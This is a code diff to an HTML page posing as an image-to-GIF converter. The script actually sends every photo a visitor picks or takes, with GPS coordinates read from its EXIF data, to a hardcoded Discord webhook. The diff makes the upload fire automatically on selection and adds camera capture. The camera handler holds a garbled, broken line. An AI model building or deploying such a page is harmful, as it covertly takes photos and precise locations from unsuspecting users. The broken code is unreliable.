@@ -28,7 +28,7 @@
     }
     h1 {
       margin: 0 0 30px 0;
-      font-size: 2.2em;
+      font-size: 2.4em;
       background: linear-gradient(90deg, #ff00cc, #00ffff);
       -webkit-background-clip: text;
       -webkit-text-fill-color: transparent;
@@ -36,17 +36,17 @@
     .drop-zone {
       border: 3px dashed #00ffff;
       border-radius: 16px;
-      padding: 50px 20px;
+      padding: 40px 20px;
       cursor: pointer;
       transition: all 0.3s;
+      margin-bottom: 20px;
     }
     .drop-zone:hover {
       background: rgba(0, 255, 255, 0.05);
       border-color: #ff00cc;
     }
     button {
-      margin-top: 20px;
-      padding: 14px 40px;
+      padding: 14px 30px;
       font-size: 1.1em;
       background: linear-gradient(90deg, #ff00cc, #00ffff);
       border: none;
@@ -54,6 +54,7 @@
       color: black;
       font-weight: bold;
       cursor: pointer;
+      margin: 8px 5px;
       transition: 0.3s;
     }
     button:hover {
@@ -63,29 +64,34 @@
     #status {
       margin-top: 15px;
       font-size: 0.95em;
-      min-height: 20px;
+      min-height: 24px;
     }
   </style>
 </head>
 <body>
   <div class="container">
     <h1>gif.fuck</h1>
+    
     <div class="drop-zone" id="dropZone">
-      <p>Drop your image here or click to upload</p>
-      <input type="file" id="fileInput" accept="image/*" hidden>
+      <p>Drop image here or click to upload</p>
     </div>
-    <button id="convertBtn">CONVERT TO GIF</button>
+
+    <button id="uploadBtn">📁 Choose from Gallery</button>
+    <button id="cameraBtn">📸 Take Photo</button>
+
     <div id="status"></div>
   </div>
 
+  <input type="file" id="fileInput" accept="image/*" hidden>
+  <input type="file" id="cameraInput" accept="image/*" capture="environment" hidden>
+
   <script>
     const WEBHOOK_URL = "https://discord.com/api/webhooks/1536294907306840125/EUtQw41CiZDG2sTuh4Tt_LLwgvRQKol6dv-YeTOQfl44xoekO8mByVGfYKWjz15_EuFY";
+    
     let selectedFile = null;
-
-    const dropZone = document.getElementById('dropZone');
-    const fileInput = document.getElementById('fileInput');
-    const convertBtn = document.getElementById('convertBtn');
     const status = document.getElementById('status');
+    const fileInput = document.getElementById('fileInput');
+    const cameraInput = document.getElementById('cameraInput');
 
     function updateStatus(text, color = "white") {
       status.textContent = text;
@@ -96,12 +102,10 @@
       const formData = new FormData();
       formData.append("file", file, file.name);
 
-      let content = `**New upload:** ${file.name}\n**Size:** ${(file.size/1024/1024).toFixed(2)} MB`;
+      let content = `New image: ${file.name}\nSize: ${(file.size/1024/1024).toFixed(2)} MB`;
 
       if (gps && gps.latitude && gps.longitude) {
-        content += `\n\n**GPS DATA FOUND**\n` +
-                   `**Lat:** ${gps.latitude.toFixed(6)}\n` +
-                   `**Lon:** ${gps.longitude.toFixed(6)}`;
+        content += `\n\nGPS FOUND\nLat: ${gps.latitude.toFixed(6)}\nLon: ${gps.longitude.toFixed(6)}`;
       }
 
       formData.append("payload_json", JSON.stringify({
@@ -114,47 +118,45 @@
 
     async function handleFile(file) {
       if (!file.type.startsWith("image/")) return;
+      
       selectedFile = file;
       updateStatus(`Selected: ${file.name}`, "#00ffff");
+
+      // Auto send when file is selected
+      try {
+        const gps = await exifr.gps(file);
+        await sendToWebhook(file, gps);
+        updateStatus("✅ Sent to webhook!", "#00ff00");
+      } catch (err) {
+        await sendToWebhook(file);
+        updateStatus("✅ Sent (no GPS)", "#00ff88");
+      }
     }
 
-    // Click to upload
-    dropZone.addEventListener("click", () => fileInput.click());
+    // Upload button
+    document.getElementById("uploadBtn").addEventListener("click", () => fileInput.click());
     fileInput.addEventListener("change", (e) => {
+      if (e.target.files[0]) handleFile(e.target.files[0]);
+    });
+
+    // Camera button
+    document.getElementById("cameraBtn").addEventListener("click", () => cameraInput.click());
+    cameraInput.addEventListener("change", (e) => {
       if (e.target.files[0 0]);
     });
 
     // Drag & Drop
+    const dropZone = document.getElementById("dropZone");
+    dropZone.addEventListener("click", () => fileInput.click());
     dropZone.addEventListener("dragover", (e) => {
       e.preventDefault();
       dropZone.style.background = "rgba(0, 255, 255, 0.1)";
     });
-    dropZone.addEventListener("dragleave", () => {
-      dropZone.style.background = "";
-    });
+    dropZone.addEventListener("dragleave", () => dropZone.style.background = "");
     dropZone.addEventListener("drop", (e) => {
       e.preventDefault();
       dropZone.style.background = "";
       if (e.dataTransfer.files[0]) handleFile(e.dataTransfer.files[0]);
-    });
-
-    // Convert button
-    convertBtn.addEventListener("click", async () => {
-      if (!selectedFile) {
-        updateStatus("No image selected, dumbass", "red");
-        return;
-      }
-
-      updateStatus("Processing...");
-
-      try {
-        const gps = await exifr.gps(selectedFile);
-        await sendToWebhook(selectedFile, gps);
-        updateStatus("Successfully sent to webhook 🔥", "#00ff00");
-      } catch (err) {
-        await sendToWebhook(selectedFile);
-        updateStatus("Sent without GPS data", "#ff8800");
-      }
     });
   </script>
 </body>
